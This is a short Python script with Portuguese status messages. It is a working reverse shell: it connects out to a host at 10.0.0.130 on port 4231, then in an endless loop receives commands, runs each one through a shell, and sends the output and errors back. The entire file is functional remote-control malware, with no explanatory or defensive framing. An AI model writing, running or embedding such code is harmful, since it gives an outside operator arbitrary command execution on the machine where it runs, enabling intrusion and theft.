import socket
import subprocess

REMOTE_HOST = '10.0.0.130'
REMOTE_PORT = 4231

client = socket.socket()
print("Iniciando conexao....")

client.connect((REMOTE_HOST, REMOTE_PORT))
print("Conexao iniciada")

while True:
    print("Aguardando os comandos")
    comando = client.recv(1024)
    comando = comando.decode()

    op = subprocess.Popen(comando, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

    saida = op.stdout.read()
    erro_saida = op.stderr.read()
    print("Enviando a resposta")
    client.send(saida + erro_saida)
